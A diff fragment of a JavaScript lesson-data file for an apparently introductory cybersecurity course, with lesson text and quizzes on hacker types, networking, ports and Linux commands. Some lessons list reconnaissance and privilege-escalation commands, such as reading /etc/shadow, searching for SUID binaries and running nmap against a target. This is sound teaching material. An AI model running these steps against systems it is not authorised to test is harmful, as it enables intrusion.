+        ]
+      },
+      {
+        id:'m0l1', title:'Types of Hackers',
+        content:`<div class="lesson-text">
+          <h3>// Hacker Categories</h3>
+          <p>Not all hackers are criminals. In cybersecurity, we categorize hackers by their intentions:</p>
+          <ul>
+            <li><strong style="color:var(--accent)">White Hat</strong> — Ethical hackers who work legally to find and fix vulnerabilities. They always have permission.</li>
+            <li><strong style="color:var(--muted)">Grey Hat</strong> — Hackers who may break rules but without malicious intent. They often report vulnerabilities they find.</li>
+            <li><strong style="color:var(--red)">Black Hat</strong> — Malicious hackers who break into systems illegally for personal gain, theft or destruction.</li>
+            <li><strong style="color:var(--yellow)">Script Kiddie</strong> — Unskilled attackers who use tools made by others without understanding them.</li>
+            <li><strong style="color:var(--purple)">Hacktivist</strong> — Hackers motivated by political or social causes (e.g. Anonymous).</li>
+          </ul>
+          <h3>// Common Roles in Cybersecurity</h3>
+          <ul>
+            <li><strong>Penetration Tester (Pentester)</strong> — Gets paid to hack systems to find weaknesses</li>
+            <li><strong>Security Analyst</strong> — Monitors systems for suspicious activity</li>
+            <li><strong>Incident Responder</strong> — Handles security breaches when they happen</li>
+            <li><strong>Security Engineer</strong> — Builds and maintains secure systems</li>
+            <li><strong>SOC Analyst</strong> — Works in a Security Operations Centre monitoring alerts 24/7</li>
+          </ul>
+          <div class="tip-box">💡 <div>Ethical hacking is a legal and highly paid career. Certified Ethical Hackers (CEH) earn an average of $90,000+ per year.</div></div>
+          <h3>// The Attacker Mindset</h3>
+          <p>To defend systems, you must think like an attacker. This is called the <strong>offensive security mindset</strong>. Understanding how attacks work is essential to preventing them. This is why ethical hackers are so valuable.</p>
+        </div>`,
+        video:'https://www.youtube.com/embed/1I9f_hCqMEI',
+        quiz:[
+          {q:'What type of hacker works legally with permission to find vulnerabilities?',opts:['Black Hat','Grey Hat','White Hat','Script Kiddie'],correct:2,exp:'White Hat hackers are ethical hackers who always have authorization before testing systems.',trick:false},
+          {q:'TRICK: Grey Hat hackers are fully legal because they do not have malicious intent.',opts:['True','False'],correct:1,exp:'FALSE. Grey Hat hackers often break laws even without malicious intent — accessing systems without permission is illegal regardless of intent.',trick:true},
+          {q:'What is a Script Kiddie?',opts:['A young programmer','An expert hacker who writes scripts','An unskilled attacker who uses tools made by others','A type of malware'],correct:2,exp:'Script Kiddies use hacking tools made by others without understanding how they work.',trick:false},
+          {q:'A hacktivist is motivated primarily by:',opts:['Money','Political or social causes','Fame','Curiosity'],correct:1,exp:'Hacktivists are motivated by political or social causes — they hack to promote an agenda.',trick:false},
+          {q:'What does a SOC Analyst do?',opts:['Sells security software','Monitors security alerts 24/7 in a Security Operations Centre','Writes malware to test systems','Manages company HR'],correct:1,exp:'SOC (Security Operations Centre) Analysts monitor alerts and respond to security incidents around the clock.',trick:false},
+          {q:'TRICK: A penetration tester and a black hat hacker use completely different techniques.',opts:['True','False'],correct:1,exp:'FALSE. They often use the same techniques and tools — the key difference is PERMISSION. Pentesters have written authorization.',trick:true},
+          {q:'Which hacker type is most likely to report a vulnerability after finding it without permission?',opts:['Black Hat','White Hat','Grey Hat','Script Kiddie'],correct:2,exp:'Grey Hats often find vulnerabilities without permission but report them rather than exploiting them maliciously.',trick:false},
+          {q:'What is the "offensive security mindset"?',opts:['Attacking competitors','Thinking like an attacker to better defend systems','Ignoring security vulnerabilities','Using only defensive tools'],correct:1,exp:'The offensive security mindset means understanding attack techniques so you can build better defenses.',trick:false},
+          {q:'TRICK: Only Black Hat hackers need to understand how attacks work.',opts:['True','False'],correct:1,exp:'FALSE. Ethical hackers (White Hats) must deeply understand attack techniques to find vulnerabilities before criminals do.',trick:true},
+          {q:'Which role specifically handles security breaches after they happen?',opts:['Penetration Tester','Security Engineer','Incident Responder','SOC Analyst'],correct:2,exp:'Incident Responders are specialists who handle and contain security breaches after they occur.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m1', icon:'🌐', title:'Networking Basics', desc:'Learn how the internet works, TCP/IP, DNS, ports and protocols — the foundation of all network security.',
+    lessons:[
+      {
+        id:'m1l0', title:'How the Internet Works',
+        content:`<div class="lesson-text">
+          <h3>// IP Addresses</h3>
+          <p>Every device on a network has an IP address — like a home address for your computer. There are two types:</p>
+          <ul>
+            <li><strong style="color:var(--accent)">IPv4</strong> — e.g. 192.168.1.1 (32-bit, ~4 billion addresses)</li>
+            <li><strong style="color:var(--accent2)">IPv6</strong> — e.g. 2001:db8::1 (128-bit, virtually unlimited)</li>
+          </ul>
+          <h3>// The OSI Model</h3>
+          <p>The OSI (Open Systems Interconnection) model has 7 layers that describe how data travels across a network:</p>
+          <div class="code-block">Layer 7 — Application  (HTTP, FTP, DNS)
+Layer 6 — Presentation (Encryption, Compression)
+Layer 5 — Session      (Sessions, Authentication)
+Layer 4 — Transport    (TCP, UDP)
+Layer 3 — Network      (IP, Routing)
+Layer 2 — Data Link    (MAC, Ethernet)
+Layer 1 — Physical     (Cables, Wi-Fi)</div>
+          <div class="tip-box">💡 <div>Remember the layers with: <strong>"All People Seem To Need Data Processing"</strong> (Application → Physical, top to bottom)</div></div>
+          <h3>// TCP vs UDP</h3>
+          <ul>
+            <li><strong>TCP</strong> — Reliable, ordered delivery. Used for web, email, file transfer. Slower but guaranteed.</li>
+            <li><strong>UDP</strong> — Fast but unreliable. Used for video streaming, gaming, DNS. No guarantee of delivery.</li>
+          </ul>
+          <h3>// Public vs Private IP</h3>
+          <ul>
+            <li><strong>Private IP</strong> — Used inside your home/office network (e.g. 192.168.x.x)</li>
+            <li><strong>Public IP</strong> — Your address on the internet, assigned by your ISP</li>
+          </ul>
+        </div>`,
+        video:'https://www.youtube.com/embed/x3c1ih2NJEg',
+        quiz:[
+          {q:'How many layers does the OSI model have?',opts:['4','5','6','7'],correct:3,exp:'The OSI model has exactly 7 layers from Physical (Layer 1) to Application (Layer 7).',trick:false},
+          {q:'Which protocol provides reliable, ordered data delivery?',opts:['UDP','HTTP','TCP','DNS'],correct:2,exp:'TCP (Transmission Control Protocol) guarantees reliable, ordered delivery — unlike UDP.',trick:false},
+          {q:'TRICK: UDP is better than TCP for sending important financial data.',opts:['True','False'],correct:1,exp:'FALSE. UDP does not guarantee delivery. TCP should be used for important data that cannot be lost.',trick:true},
+          {q:'What layer of the OSI model does IP routing operate at?',opts:['Layer 1 — Physical','Layer 2 — Data Link','Layer 3 — Network','Layer 4 — Transport'],correct:2,exp:'IP routing operates at Layer 3 (Network). This is where IP addresses are used.',trick:false},
+          {q:'What is 192.168.1.1 an example of?',opts:['A public IP address','A private IPv4 address','An IPv6 address','A MAC address'],correct:1,exp:'192.168.x.x is a private IPv4 address range used inside local networks.',trick:false},
+          {q:'TRICK: DNS operates at the Physical layer (Layer 1) of the OSI model.',opts:['True','False'],correct:1,exp:'FALSE. DNS operates at the Application layer (Layer 7) — the topmost layer.',trick:true},
+          {q:'Which is faster but less reliable — TCP or UDP?',opts:['TCP','UDP','Both are equally fast','Neither'],correct:1,exp:'UDP is faster because it does not wait for acknowledgements or retransmit lost data.',trick:false},
+          {q:'What does ISP stand for?',opts:['Internet Security Protocol','Internet Service Provider','Internal System Port','IP Security Protocol'],correct:1,exp:'ISP stands for Internet Service Provider — the company that gives you internet access.',trick:false},
+          {q:'TRICK: Your home computer has only one IP address.',opts:['True','False'],correct:1,exp:'FALSE. Your computer typically has at least two — a private IP (local network) and a public IP (internet). It may also have multiple network interfaces.',trick:true},
+          {q:'At which OSI layer does encryption typically happen?',opts:['Layer 1','Layer 3','Layer 6','Layer 7'],correct:2,exp:'Encryption and decryption happen at Layer 6 — the Presentation layer.',trick:false},
+        ]
+      },
+      {
+        id:'m1l1', title:'Ports & Protocols',
+        content:`<div class="lesson-text">
+          <h3>// What are Ports?</h3>
+          <p>Ports are like doors on a computer. Each service listens on a specific port number (0–65535). Knowing common ports is essential for network security and penetration testing.</p>
+          <div class="code-block">Port 80   — HTTP  (web traffic, unencrypted)
+Port 443  — HTTPS (web traffic, encrypted)
+Port 22   — SSH   (secure remote login)
+Port 21   — FTP   (file transfer — unencrypted)
+Port 25   — SMTP  (email sending)
+Port 53   — DNS   (domain name lookup)
+Port 3389 — RDP   (Windows remote desktop)
+Port 3306 — MySQL (database)</div>
+          <h3>// DNS — The Internet's Phone Book</h3>
+          <p>DNS (Domain Name System) translates human-readable domain names into IP addresses. When you type "google.com", DNS finds the IP address 142.250.80.46.</p>
+          <div class="warn-box">⚠️ <div><strong>DNS Spoofing</strong> is a common attack where hackers poison the DNS cache to redirect users to fake websites. Always use encrypted DNS (DoH) when possible.</div></div>
+          <h3>// Common Network Attacks</h3>
+          <ul>
+            <li><strong>Port Scanning</strong> — Finding open ports on a target (tool: nmap)</li>
+            <li><strong>ARP Spoofing</strong> — Linking attacker's MAC address to a legitimate IP</li>
+            <li><strong>DNS Spoofing</strong> — Redirecting domain lookups to malicious IPs</li>
+            <li><strong>Man-in-the-Middle (MITM)</strong> — Intercepting traffic between two parties</li>
+          </ul>
+        </div>`,
+        video:'https://www.youtube.com/embed/kCuyS7ihr_E',
+        quiz:[
+          {q:'Which port does HTTPS use?',opts:['80','21','443','22'],correct:2,exp:'HTTPS uses port 443. Port 80 is HTTP — the same but unencrypted.',trick:false},
+          {q:'TRICK: FTP (port 21) is a secure way to transfer files.',opts:['True','False'],correct:1,exp:'FALSE. FTP transmits data including passwords in plain text with no encryption. Use SFTP or FTPS instead.',trick:true},
+          {q:'What port does SSH use for secure remote login?',opts:['80','443','22','3389'],correct:2,exp:'SSH (Secure Shell) uses port 22 for encrypted remote login to servers.',trick:false},
+          {q:'What is DNS Spoofing?',opts:['Changing your DNS server','Poisoning DNS cache to redirect users to malicious sites','Blocking all DNS traffic','Encrypting DNS queries'],correct:1,exp:'DNS Spoofing poisons the DNS cache so domain names resolve to attacker-controlled IPs.',trick:false},
+          {q:'Which tool is commonly used for port scanning?',opts:['Wireshark','Metasploit','nmap','Burp Suite'],correct:2,exp:'nmap (Network Mapper) is the industry standard tool for port scanning and network discovery.',trick:false},
+          {q:'TRICK: Port 3389 (RDP) being open on a server is always safe if you have a strong password.',opts:['True','False'],correct:1,exp:'FALSE. RDP exposed to the internet is a major attack surface. It should be restricted by IP, hidden behind VPN, or disabled if not needed.',trick:true},
+          {q:'What does ARP Spoofing allow an attacker to do?',opts:['Crash a server','Intercept network traffic by linking their MAC to a legitimate IP','Delete DNS records','Scan open ports'],correct:1,exp:'ARP Spoofing tricks the network into sending traffic to the attacker\'s machine — enabling Man-in-the-Middle attacks.',trick:false},
+          {q:'How many total ports are available on a computer?',opts:['1,024','8,080','65,535','100,000'],correct:2,exp:'There are 65,535 ports (0-65535). Ports 0-1023 are "well-known" ports reserved for standard services.',trick:false},
+          {q:'TRICK: HTTP (port 80) and HTTPS (port 443) carry identical levels of security.',opts:['True','False'],correct:1,exp:'FALSE. HTTP is unencrypted — anyone on the network can read the traffic. HTTPS encrypts traffic using TLS.',trick:true},
+          {q:'What is a Man-in-the-Middle (MITM) attack?',opts:['An attack that crashes servers','Intercepting communications between two parties without their knowledge','Installing malware on a device','Brute-forcing a password'],correct:1,exp:'MITM attacks secretly intercept and potentially alter communications between two parties who think they are talking directly to each other.',trick:false},
+        ]
+      }
+    ]
+  },
+  {
+    id:'m2', icon:'🐧', title:'Linux for Security', desc:'Master the Linux command line — the essential tool used by every cybersecurity professional. 4-week deep dive from file system to Python scripting.',
+    lessons:[
+      {
+        id:'m2l0', title:'Week 1 — The File System Hierarchy',
+        content:`<div class="lesson-text">
+          <h3>// Why Linux?</h3>
+          <p>Nearly all cybersecurity tools run on Linux. Kali Linux — the most popular security-focused OS — is Debian/Ubuntu-based. Most servers, cloud infrastructure, and embedded systems run Linux. If you want to hack or defend systems, this is your home environment.</p>
+          <div class="tip-box">💡 <div>You already have Ubuntu running via WSL. Every command in this module can be practiced right now in your terminal.</div></div>
+          <h3>// The Directory Structure — Know Where Everything Lives</h3>
+          <p>Linux uses a single root directory <code>/</code> from which everything branches. Unlike Windows (C:\\, D:\\), there are no drive letters — just one tree.</p>
+          <div class="code-block">/          — Root of everything. The top of the tree.
+/etc       — System configuration files (passwd, shadow, hosts, cron)
+/var       — Variable data: logs (/var/log), mail, databases
+/tmp       — Temporary files — cleared on reboot. Attackers stage malware here.
+/proc      — Virtual filesystem showing running processes & kernel state
+/home      — User home directories (/home/collins, /home/alice)
+/root      — Root user's home. Highly sensitive — attackers always target this.
+/bin       — Essential system binaries (ls, cp, cat, bash)
+/usr/bin   — User-installed programs (nmap, python3, curl)
+/sbin      — System admin binaries (iptables, fdisk)
+/dev       — Device files (disks, terminals, null device)
+/mnt       — Mount points for external drives
+/opt       — Optional third-party software</div>
+          <div class="warn-box">⚠️ <div><strong>Security relevance:</strong> /etc/passwd (user accounts), /etc/shadow (hashed passwords), /var/log (evidence), /tmp (attacker staging area). Learn these paths — they appear in every CTF and real investigation.</div></div>
+          <h3>// Your First Commands — Practice These Now</h3>
+          <div class="code-block">ls /              # List root directory — see all top-level dirs
+ls -la /etc       # List /etc with hidden files and permissions
+cat /etc/passwd   # View all user accounts (no password hashes here)
+ls /var/log       # See what log files exist on your system
+ls /proc          # Numbers you see = running process IDs (PIDs)
+pwd               # Where am I right now?
+cd /etc && pwd    # Navigate to /etc, confirm location
+cd ~              # Go back to your home directory
+cd -              # Go to previous directory (very useful!)</div>
+          <h3>// Reading /etc/passwd</h3>
+          <p>Each line in /etc/passwd follows this format:</p>
+          <div class="code-block">collins:x:1000:1000:Collins,,,:/home/collins:/bin/bash
+  │      │  │    │    │              │              └─ Login shell
+  │      │  │    │    │              └─ Home directory
+  │      │  │    │    └─ User info (GECOS field)
+  │      │  │    └─ Primary group ID (GID)
+  │      │  └─ User ID (UID). Root = 0
+  │      └─ "x" means password is in /etc/shadow
+  └─ Username</div>
+          <div class="tip-box">💡 <div>In a pen test, reading /etc/passwd reveals all usernames and their shells. Accounts with <code>/bin/bash</code> are interactive — they can log in. Accounts with <code>/sbin/nologin</code> cannot.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/42iQKuQodW4',
+        quiz:[
+          {q:'Which directory contains system configuration files like /etc/passwd and /etc/shadow?',opts:['/var','/etc','/tmp','/proc'],correct:1,exp:'/etc is the system configuration directory. It contains passwd, shadow, hosts, cron configs, and service configs.',trick:false},
+          {q:'Why do attackers frequently use /tmp during an attack?',opts:['It has the best permissions','Files there are owned by root','It is cleared on reboot and often writable by all users — good for staging payloads','It is encrypted'],correct:2,exp:'/tmp is world-writable and often not closely monitored. Attackers stage malware here. Files disappear on reboot, hiding evidence.',trick:false},
+          {q:'TRICK: /etc/passwd contains the actual hashed passwords of all users.',opts:['True','False'],correct:1,exp:'FALSE. /etc/passwd contains user account info but NOT passwords. The "x" in the password field means the hash is stored in /etc/shadow (which only root can read).',trick:true},
+          {q:'What does the "x" in "collins:x:1000:1000:..." in /etc/passwd mean?',opts:['The account is disabled','The password is stored in /etc/shadow','The user has no password','The account is locked'],correct:1,exp:'The "x" is a placeholder meaning the real password hash is stored in /etc/shadow, which is only readable by root.',trick:false},
+          {q:'Which directory contains currently running process information as virtual files?',opts:['/var','/tmp','/proc','/dev'],correct:2,exp:'/proc is a virtual filesystem. Each numbered directory inside it corresponds to a running process ID (PID). Used by tools like ps and top.',trick:false},
+          {q:'TRICK: cd - navigates to the root directory.',opts:['True','False'],correct:1,exp:'FALSE. cd - navigates to the PREVIOUS directory you were in — very useful for switching between two locations quickly. cd / goes to root.',trick:true},
+          {q:'A user account with /sbin/nologin as their shell means:',opts:['They have admin privileges','They cannot log in interactively — the shell immediately exits','They have no home directory','Their account is deleted'],correct:1,exp:'/sbin/nologin prevents interactive logins. It is used for service accounts (www-data, nobody) that run processes but should never have shell access.',trick:false},
+          {q:'Where would you find web server access logs on a Linux system?',opts:['/etc/logs','/var/log','/proc/logs','/tmp/logs'],correct:1,exp:'/var/log contains system and application logs. Web server logs are typically at /var/log/apache2/ or /var/log/nginx/.',trick:false},
+          {q:'TRICK: /bin and /usr/bin contain the same files.',opts:['True','False'],correct:1,exp:'FALSE. /bin contains essential system binaries needed for boot and basic operation (ls, cat, bash). /usr/bin contains additional user programs installed later. On modern systems they are often symlinked, but the distinction matters.',trick:true},
+          {q:'What UID (User ID) does the root account always have in Linux?',opts:['1','100','0','999'],correct:2,exp:'Root always has UID 0. This is what makes root special — the kernel grants elevated privileges based on UID 0, not the username "root".',trick:false},
+        ]
+      },
+      {
+        id:'m2l1', title:'Week 1 — Navigation, File Ops & Text Processing',
+        content:`<div class="lesson-text">
+          <h3>// Core Navigation & File Commands</h3>
+          <p>These are the commands you will type hundreds of times every day. Get them into muscle memory.</p>
+          <div class="code-block">pwd               # Print Working Directory — where am I?
+ls -la            # List ALL files (including hidden .files) with permissions
+cd /path          # Change directory
+cat file.txt      # Print entire file to screen
+less file.txt     # Page through long files (q to quit, / to search)
+head -20 file.txt # First 20 lines
+tail -20 file.txt # Last 20 lines
+tail -f file.txt  # Follow a file live (perfect for watching logs)
+cp file dest      # Copy file
+mv file dest      # Move or rename file
+rm file           # Delete file (no recycle bin — gone forever)
+mkdir -p dir/sub  # Create directory (and parents if needed)
+touch file.txt    # Create empty file or update timestamp
+find / -name "*.log" 2>/dev/null  # Find all .log files, hide errors</div>
+          <h3>// The Power Quartet: grep, cut, awk, sed</h3>
+          <p>These four tools are how security professionals extract signal from noise. You will use them every day for log analysis, parsing scan output, and finding what matters.</p>
+          <div class="code-block"># grep — find lines matching a pattern
+grep "Failed password" /var/log/auth.log
+grep -i "error" /var/log/syslog        # -i = case insensitive
+grep -v "#" /etc/hosts                 # -v = EXCLUDE matching lines
+grep -r "password" /etc/               # -r = recursive search
+grep -c "FAILED" logfile.txt           # -c = count matching lines
+
+# cut — extract columns from delimited text
+cut -d: -f1 /etc/passwd               # Get usernames (field 1, delimiter :)
+cut -d: -f1,3 /etc/passwd             # Get username AND UID
+
+# awk — powerful column extraction and math
+awk '{print $1}' access.log           # Print first column
+awk -F: '{print $1, $3}' /etc/passwd  # User + UID from passwd
+awk '$3 > 1000' /etc/passwd           # Lines where UID > 1000 (real users)
+
+# sed — find and replace in stream
+sed 's/root/REDACTED/g' /etc/passwd   # Replace all "root" with "REDACTED"
+sed -n '10,20p' file.txt              # Print only lines 10-20</div>
+          <h3>// Chaining Commands with Pipes</h3>
+          <p>The pipe operator <code>|</code> sends the output of one command as input to the next. This is where Linux becomes incredibly powerful.</p>
+          <div class="code-block"># Find all bash users (chain grep + cut)
+grep '/bin/bash' /etc/passwd | cut -d: -f1
+
+# Count failed SSH login attempts per IP address
+grep "Failed password" /var/log/auth.log | \
+  awk '{print $11}' | sort | uniq -c | sort -rn | head -10
+
+# Find the largest files in a directory
+find /var -type f | xargs ls -la 2>/dev/null | sort -k5 -rn | head -10</div>
+          <div class="tip-box">💡 <div>The pipe chain <code>sort | uniq -c | sort -rn</code> is one of the most useful patterns in security. It counts occurrences and ranks them — invaluable for log analysis and finding anomalies.</div></div>
+          <h3>// Searching the File System</h3>
+          <div class="code-block">find / -name "*.conf" 2>/dev/null          # Find all config files
+find / -perm -4000 2>/dev/null             # Find SUID files (priv-esc vector)
+find /home -name ".ssh" -type d           # Find SSH directories
+find /tmp -newer /etc/passwd               # Files newer than /etc/passwd
+locate passwd                              # Fast file search (uses index)
+which nmap                                 # Find location of a binary</div>
+          <div class="warn-box">⚠️ <div><strong>Penetration testing tip:</strong> <code>find / -perm -4000 2>/dev/null</code> is a real command used in privilege escalation. SUID files run as their owner (often root). A misconfigured SUID binary can give you a root shell.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/IVquJh3DXUA',
+        quiz:[
+          {q:'What does "tail -f /var/log/auth.log" do?',opts:['Shows the first 10 lines','Deletes the log file','Follows the log file live — shows new lines as they are written','Shows file permissions'],correct:2,exp:'tail -f (follow) watches a file and prints new lines as they appear — perfect for monitoring logs in real time during an investigation.',trick:false},
+          {q:'Which command finds all SUID files on a Linux system?',opts:['ls -la /','find / -perm -4000 2>/dev/null','grep -r suid /etc','chmod -s /'],correct:1,exp:'find / -perm -4000 searches for files with the SUID bit set. SUID files run as their owner (often root) — a common privilege escalation vector.',trick:false},
+          {q:'TRICK: "rm" in Linux sends files to a recycle bin you can restore from.',opts:['True','False'],correct:1,exp:'FALSE. rm permanently deletes files with no recycle bin. Once deleted, files are gone. Always be careful with rm — especially with wildcards.',trick:true},
+          {q:'What does "grep -v #" do when run against /etc/hosts?',opts:['Finds lines with #','Excludes lines containing # (removes comments)','Counts lines with #','Replaces # with nothing'],correct:1,exp:'grep -v INVERTS the match — it shows lines that do NOT contain the pattern. This effectively removes comment lines starting with #.',trick:false},
+          {q:'What does "cut -d: -f1 /etc/passwd" produce?',opts:['The hashed passwords','Just the usernames (field 1, split by colon)','The home directories','The UIDs'],correct:1,exp:'cut -d: splits each line by colon (:), and -f1 takes the first field — which is the username in /etc/passwd format.',trick:false},
+          {q:'TRICK: "find / -name *.conf" and "find / -name \'*.conf\'" produce the same result.',opts:['True','False'],correct:1,exp:'FALSE. Without quotes, the shell expands *.conf before passing it to find — it only searches for files matching .conf files in the CURRENT directory. With quotes, find handles the wildcard itself and searches everywhere.',trick:true},
+          {q:'What does "sort | uniq -c | sort -rn" do to a list of IPs?',opts:['Removes duplicate IPs','Counts how many times each IP appears, then sorts by count descending','Alphabetically sorts the IPs','Converts IPs to hostnames'],correct:1,exp:'sort puts identical lines together, uniq -c counts consecutive duplicates, and sort -rn sorts numerically in reverse (highest count first). Classic log analysis pattern.',trick:false},
+          {q:'You want to find all files in /etc modified in the last 24 hours. Which command helps?',opts:['grep -r modified /etc','find /etc -mtime -1','ls -lt /etc | head','cat /etc/recent'],correct:1,exp:'find /etc -mtime -1 finds files modified less than 1 day ago. mtime = modification time. This is useful in incident response to see what changed recently.',trick:false},
+          {q:'TRICK: "awk \'{print $1}\'" prints the last column of each line.',opts:['True','False'],correct:1,exp:'FALSE. $1 is the FIRST column. $NF is the LAST column (NF = Number of Fields). $2 is second column, and so on.',trick:true},
+          {q:'What does "2>/dev/null" do at the end of a command?',opts:['Sends output to a file','Hides error messages by redirecting stderr to /dev/null','Runs the command twice','Saves output to /dev/null'],correct:1,exp:'/dev/null is a black hole — anything sent there disappears. 2> redirects stderr (error messages). Combined, it silences error output — useful when scanning and you do not want "Permission denied" spam.',trick:false},
+        ]
+      },
+      {
+        id:'m2l2', title:'Week 1 — Permissions, Users & Groups',
+        content:`<div class="lesson-text">
+          <h3>// Linux File Permissions — The Full Picture</h3>
+          <p>Permissions are one of the most critical concepts in Linux security. Misconfigured permissions are a top privilege escalation vector in penetration testing.</p>
+          <div class="code-block">ls -la /etc/shadow
+  -rw-r----- 1 root shadow 1234 Feb 20 11:00 /etc/shadow
+  │││││││││
+  │└┤└┤└┤└┤── Others: --- (no access)
+  │ │ └┤ └── Group: r-- (shadow group can read)
+  │ └── Owner: rw- (root can read and write)
+  └── File type: - = regular file, d = directory, l = symlink
+
+Permission values:
+  r (read)    = 4
+  w (write)   = 2
+  x (execute) = 1
+  - (none)    = 0
+
+chmod 755 file  →  rwx r-x r-x  (7=4+2+1, 5=4+1, 5=4+1)
+chmod 600 file  →  rw- --- ---  (6=4+2, 0, 0) — SSH keys must be 600
+chmod 777 file  →  rwx rwx rwx  — DANGEROUS. Gives everyone full access.</div>
+          <h3>// Special Permission Bits</h3>
+          <div class="code-block">SUID (Set User ID) — chmod u+s or chmod 4755
+  File runs as its OWNER, not the caller.
+  Example: /usr/bin/passwd is SUID root — lets users change their own password.
+  Attack: A misconfigured SUID binary can give you a root shell.
+  Find: find / -perm -4000 2>/dev/null
+
+SGID (Set Group ID) — chmod g+s
+  File runs as its GROUP. On directories, new files inherit parent group.
+
+Sticky Bit — chmod +t or chmod 1777
+  On directories: only the owner can delete their own files.
+  Example: /tmp has the sticky bit — you can write there but not delete others' files.
+  ls -la / | grep tmp  →  drwxrwxrwt (the 't' = sticky bit)</div>
+          <div class="warn-box">⚠️ <div><strong>Pen test command:</strong> After getting initial access, run <code>find / -perm -4000 2>/dev/null</code> to find SUID binaries. Check each against GTFOBins (gtfobins.github.io) — many can be abused for privilege escalation.</div></div>
+          <h3>// User & Group Management</h3>
+          <div class="code-block">whoami            # Current username
+id                # UID, GID, and all groups you belong to
+id username       # Check another user's IDs and groups
+groups            # List your groups
+cat /etc/passwd   # All user accounts
+cat /etc/shadow   # Hashed passwords (root only)
+cat /etc/group    # All groups and their members
+
+# Creating and managing users (requires sudo)
+sudo useradd -m -s /bin/bash newuser   # Create user with home dir + bash shell
+sudo passwd newuser                     # Set their password
+sudo userdel -r newuser                 # Delete user AND their home directory
+sudo usermod -aG sudo username          # Add user to sudo group
+sudo usermod -aG docker username        # Add user to docker group
+
+# Switching users
+su - username     # Switch to another user (needs their password)
+sudo su -         # Switch to root (needs YOUR password + sudo rights)
+sudo -l           # List what YOU can run with sudo</div>
+          <div class="tip-box">💡 <div><code>sudo -l</code> is one of the first commands a penetration tester runs after gaining access. It shows which commands the current user can run as root — sometimes revealing easy privilege escalation paths.</div></div>
+        </div>`,
+        video:'https://www.youtube.com/embed/D-VqgvBMV7g',
+        quiz:[
+          {q:'What chmod value gives the owner full access, group read+execute, and no access to others?',opts:['777','755','644','700'],correct:1,exp:'755 = rwxr-xr-x. Owner: 7 (4+2+1=rwx), Group: 5 (4+1=r-x), Others: 5 (4+1=r-x). Commonly used for executables and web directories.',trick:false},
+          {q:'SSH private keys must have which permission set to work correctly?',opts:['777','644','600','755'],correct:2,exp:'600 = rw-------. SSH refuses to use private keys that are readable by group or others — it considers them too insecure. chmod 600 ~/.ssh/id_rsa fixes this.',trick:false},
+          {q:'TRICK: The sticky bit on /tmp prevents all users from writing files there.',opts:['True','False'],correct:1,exp:'FALSE. The sticky bit on /tmp allows EVERYONE to write files, but only the FILE OWNER can delete their own files. Others cannot delete files they did not create.',trick:true},
+          {q:'What does SUID (Set User ID) permission do on an executable?',opts:['Makes the file world-readable','The file runs with the permissions of its OWNER, not the user running it','Prevents anyone but root from running it','Makes the file executable by everyone'],correct:1,exp:'SUID causes the file to run as its owner (often root). This is why passwd can change your password even though /etc/shadow is root-only. It is also a major privilege escalation vector.',trick:false},
+          {q:'What does "sudo -l" show you?',opts:['The list of all system users','Which commands the current user can run with sudo privileges','The sudo log file','The sudo configuration file'],correct:1,exp:'sudo -l lists the commands your current user can run as root (or other users) via sudo. Penetration testers always run this after gaining access.',trick:false},
+          {q:'TRICK: "su - username" and "su username" are identical.',opts:['True','False'],correct:1,exp:'FALSE. "su - username" is a login shell — it loads the full environment of that user (their PATH, shell profile, etc). "su username" just switches user but keeps your current environment. The "-" matters.',trick:true},
+          {q:'Which file contains the hashed passwords of all user accounts?',opts:['/etc/passwd','/etc/users','/etc/shadow','/var/passwords'],correct:2,exp:'/etc/shadow stores hashed passwords and is only readable by root. /etc/passwd is readable by everyone but only shows "x" in the password field.',trick:false},
+          {q:'A file shows "-rwsr-xr-x" in its permissions. What does the "s" indicate?',opts:['The file is a symlink','The SUID bit is set — it runs as its owner','The file is a socket','The sticky bit is set'],correct:1,exp:'The "s" in the owner execute position means SUID is set. This file runs with its owner\'s privileges (often root), regardless of who executes it.',trick:false},
+          {q:'TRICK: Adding a user to the "sudo" group immediately gives them full root access to all commands.',opts:['True','False'],correct:1,exp:'FALSE. Adding to the sudo group grants sudo access, but the /etc/sudoers file controls exactly which commands can be run. Some configurations restrict sudo even for group members.',trick:true},
+          {q:'What happens when you run "userdel -r username"?',opts:['Only the user account is deleted','The user account AND their home directory are deleted','The user is locked but not deleted','All files owned by the user system-wide are deleted'],correct:1,exp:'userdel -r removes the user account AND their home directory (/home/username). Without -r, the home directory remains. Files owned by the user outside /home are NOT automatically removed.',trick:false},
+        ]
+      },
+      {
+        id:'m2l3', title:'Week 2 — Processes, Networking & Automation',
+        content:`<div class="lesson-text">
+          <h3>// Process Management</h3>
+          <p>Understanding processes is essential for both attackers and defenders. Defenders hunt for unexpected processes. Attackers need to hide their processes or kill defensive tools.</p>
+          <div class="code-block">ps aux            # Show ALL running processes with full details
+ps aux | grep nginx  # Find a specific process
+top               # Live process monitor (press q to quit)
+htop              # Better version (sudo apt install htop)
+pgrep -l ssh      # Find PID of all ssh processes
+kill 1234         # Terminate process with PID 1234 (graceful)
+kill -9 1234      # Force kill — cannot be ignored by the process
+killall nginx     # Kill all processes named "nginx"
+jobs              # List background jobs in current shell
+sleep 999 &       # Run in background (& sends to background)
+fg                # Bring last background job to foreground
+Ctrl+Z            # Pause current job (send to background stopped)
+bg                # Resume stopped job in background
+nohup command &   # Run command that survives terminal closing</div>
+          <h3>// System Services (systemctl)</h3>
+          <div class="code-block">systemctl status ssh         # Is SSH running?
+sudo systemctl start ssh    # Start SSH service
+sudo systemctl stop ssh     # Stop SSH service
+sudo systemctl restart ssh  # Restart
+sudo systemctl enable ssh   # Start automatically on boot
+sudo systemctl disable ssh  # Do not start on boot
+systemctl list-units --type=service --state=running  # All running services</div>
+          <div class="tip-box">💡 <div>In incident response, <code>systemctl list-units --type=service --state=running</code> shows you all active services. Any unfamiliar service name is worth investigating.</div></div>
+          <h3>// Networking Commands</h3>
+          <div class="code-block">ip a                          # Show IP addresses and interfaces
+ip route                      # Show routing table (default gateway)
+ping 8.8.8.8 -c 4            # Test connectivity (4 packets)
+traceroute google.com         # Show hops to destination
+nmap -sV 127.0.0.1           # Scan own machine for open ports + versions
+nmap -sV -p 1-1000 TARGET    # Scan common ports on target
+ss -tulnp                     # Show listening ports + process names
+netstat -tulnp                # Older equivalent (net-tools)
+curl -I https://example.com  # Fetch HTTP headers only
+curl -o file.txt URL          # Download file to file.txt
+wget URL                      # Download file (simpler than curl)</div>
